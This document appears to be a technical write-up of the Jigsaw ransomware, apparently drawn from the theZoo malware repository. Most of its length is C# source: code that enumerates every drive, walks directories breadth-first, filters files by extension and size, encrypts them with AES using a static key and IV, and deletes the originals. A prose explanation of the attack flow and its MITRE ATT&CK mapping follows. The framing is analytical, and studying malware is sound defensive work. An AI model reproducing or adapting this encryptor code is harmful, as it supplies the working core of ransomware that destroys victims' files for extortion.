# Jigsaw Ransomware - AES-256 File Encryption with Recursive File System Traversal

## Repository
**theZoo-master** → malware/Source/Original/Ransomware.Jigsaw

## Source File Path
`/malware/Source/Original/Ransomware.Jigsaw/Ransomware.Jigsaw/Tools/Locker.cs`

## Language
C#

## Code Snippet

### Recursive File System Encryption (Lines 20-35, 128-150)
```csharp
internal static void EncryptFileSystem()
{
    var extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());
#if DEBUG
    var fileSystemSimulationDirPath = CreateFileSystemSimulation();
    EncryptFiles(fileSystemSimulationDirPath, EncryptionFileExtension, extensionsToEncrypt);
#else
    // Enumerate all drives on the system
    foreach (var drivePath in DriveInfo.GetDrives().Select(drive => drive.RootDirectory.FullName))
    {
        EncryptFiles(drivePath, EncryptionFileExtension, extensionsToEncrypt);
    }
#endif
    if (!File.Exists(EncryptedFileListPath))
    {
        var stringArray = EncryptedFiles.ToArray();
        // Store list of encrypted files for later decryption tracking
        File.WriteAllLines(EncryptedFileListPath, stringArray);
    }
}

private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt )
{
    // LINQ query to filter files by extension and size
    foreach (var file in
        (from file in GetFiles(dirPath) 
         from ext in extensionsToEncrypt 
         where file.EndsWith(ext) 
         select file)
            .Select(file => new {file, fi = new FileInfo(file)})
            .Where(@t => @t.fi.Length < 10000000)  // Only encrypt files < 10MB
            .Select(@t => @t.file))
    {
        try
        {
            if (EncryptFile(file, encryptionExtension))
            {
                EncryptedFiles.Add(file);  // Track successfully encrypted files
            }
        }
        catch
        {
            // Silently ignore errors and continue
        }
    }
}
```

### BFS Queue-Based Directory Traversal (Lines 95-126)
```csharp
private static IEnumerable<string> GetFiles(string path)
{
    // Breadth-first search using queue to enumerate all files recursively
    var queue = new Queue<string>();
    queue.Enqueue(path);
    
    while (queue.Count > 0)
    {
        path = queue.Dequeue();
        try
        {
            // Add all subdirectories to queue
            foreach (var subDir in Directory.GetDirectories(path))
            {
                queue.Enqueue(subDir);
            }
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine(ex);  // Log but continue on access denied
        }
        
        string[] files = null;
        try
        {
            files = Directory.GetFiles(path);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine(ex);
        }
        
        if (files == null) continue;
        
        // Yield return each file found
        foreach (var t in files)
        {
            yield return t;
        }
    }
}
```

### AES-256 Encryption with Static Key (Lines 170-210)
```csharp
private static bool EncryptFile(string path, string encryptionExtension)
{
    try
    {
        // Exclude system directories and ransomware work folder
        if (Config.StartMode != Config.StartModeType.Debug)
            if (path.StartsWith(Config.WorkFolderPath, StringComparison.InvariantCulture) || 
                path.StartsWith(@"C:\Windows", StringComparison.InvariantCultureIgnoreCase))
                return false;
        
        using (var aes = new AesCryptoServiceProvider())
        {
            // Static AES-256 key (Base64 encoded)
            aes.Key = Convert.FromBase64String(EncryptionPassword);
            // Hardcoded IV (initialization vector)
            aes.IV = new byte[] { 0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0 };
            
            // Encrypt original file to new file with .extension
            EncryptFile(aes, path, path + encryptionExtension);
        }
    }
    catch
    {
        return false;
    }
    
    try
    {
        // Delete original plaintext file
        File.Delete(path);
    }
    catch (Exception)
    {
        return false;
    }
    
    return true;
}

private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
{
    var buffer = new byte[65536];  // 64KB buffer for streaming encryption
    
    using (var streamIn = new FileStream(inputFile, FileMode.Open))
    using (var streamOut = new FileStream(outputFile, FileMode.Create))
    using (var encrypt = new CryptoStream(streamOut, alg.CreateEncryptor(), CryptoStreamMode.Write))
    {
        int bytesRead;
        do
        {
            // Read chunks from original file
            bytesRead = streamIn.Read(buffer, 0, buffer.Length);
            if (bytesRead != 0)
                // Encrypt and write to output file
                encrypt.Write(buffer, 0, bytesRead);
        }
        while (bytesRead != 0);
    }
}
```

### Extension Filtering (Lines 82-93)
```csharp
private static IEnumerable<string> GetExtensionsToEncrypt()
{
    var extensionsToEncrypt = new HashSet<string>();
    
    // Load extensions from embedded resource (line-separated list)
    foreach (
        var ext in
            Resources.ExtensionsToEncrypt.Split(new[] { Environment.NewLine, " " },
                StringSplitOptions.RemoveEmptyEntries).ToList())
    {
        extensionsToEncrypt.Add(ext.Trim());
    }
    
    // Don't encrypt already-encrypted files
    extensionsToEncrypt.Remove(EncryptionFileExtension);
    
    return extensionsToEncrypt;
}
```

### Decryption Functionality (Lines 152-168, 212-226)
```csharp
internal static void DecryptFiles(string encryptionExtension)
{
    // Retrieve list of encrypted files
    foreach (var file in GetEncryptedFiles())
    {
        try
        {
            var ef = file + encryptionExtension;
            DecryptFile(ef, encryptionExtension);
            // Delete encrypted version after decrypting
            File.Delete(ef);
        }
        catch
        {
            // ignored
        }
    }
    // Clean up tracking file
    File.Delete(EncryptedFileListPath);
}

private static void DecryptFile(string path, string encryptionExtension)
{
    try
    {
        if (!path.EndsWith(encryptionExtension))
            return;
        
        // Remove extension to get original filename
        var decryptedFilePath = path.Remove(path.Length-4);
        
        using (var aes = new AesCryptoServiceProvider())
        {
            // Use same key/IV for decryption
            aes.Key = Convert.FromBase64String(EncryptionPassword);
            aes.IV = new byte[] { 0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0 };
            DecryptFile(aes, path, decryptedFilePath);
        }
    }
    catch
    {
        return;
    }
}
```

## Explanation

This is **Jigsaw Ransomware**, a destructive file-encrypting malware infamous for its psychological extortion tactics (progressively deleting files if ransom not paid within time limits). The C# implementation demonstrates a straightforward but effective ransomware architecture.

**Encryption Method:**
- **AES-256-CBC**: Uses .NET's `AesCryptoServiceProvider` with a static 256-bit key (Base64-encoded password stored in config) and hardcoded 16-byte IV. The key is **not** uniquely generated per victim, making this vulnerable to universal decryption if the key is leaked (as occurred with the real Jigsaw ransomware).
- **Streaming Encryption**: Processes files in 64KB chunks using `CryptoStream` to handle large files without loading entirely into memory. Creates new encrypted file (original name + custom extension), then deletes plaintext original.
- **Size Filtering**: Only encrypts files smaller than 10MB to balance encryption speed with impact (larger files often aren't critical documents).

**File System Targeting:**
- **Drive Enumeration**: Iterates through all mounted drives (`DriveInfo.GetDrives()`) to encrypt local, external, and network-mapped drives.
- **BFS Traversal**: Implements breadth-first search using a `Queue<string>` to recursively discover all files across the directory tree. Handles access-denied exceptions gracefully to continue encryption despite permission errors.
- **Extension Whitelist**: Loads target extensions from an embedded resource file (likely contains .doc, .pdf, .jpg, .xlsx, etc.) and uses LINQ to filter files. Excludes already-encrypted files and critical system directories (`C:\Windows`, ransomware work folder).

**Operational Features:**
- **Tracking Mechanism**: Writes `EncryptedFileList.txt` containing paths of all successfully encrypted files, enabling selective decryption if ransom paid. This list also serves as evidence/logging for attackers.
- **Original File Destruction**: Calls `File.Delete()` on plaintext files after successful encryption, preventing trivial recovery (though forensic undelete tools may still work on non-overwritten sectors).
- **System Exclusions**: Avoids encrypting `C:\Windows` to maintain system stability and its own work folder to preserve ransom notes and encryption lists.

**Attack Flow:**
1. Enumerate all system drives
2. Recursively traverse directories with BFS queue
3. Filter files by extension whitelist and size limit
4. Encrypt each file with AES-256 to `filename.extension` + custom suffix
5. Delete original plaintext file
6. Log encrypted file paths for tracking

This directly implements **MITRE ATT&CK T1486 (Data Encrypted for Impact)** through systematic file encryption for extortion. The real Jigsaw malware also implemented **T1490 (Inhibit System Recovery)** by deleting shadow copies and displayed disturbing ransom notes featuring the Jigsaw movie character, with progressive file deletion threats to increase psychological pressure on victims.
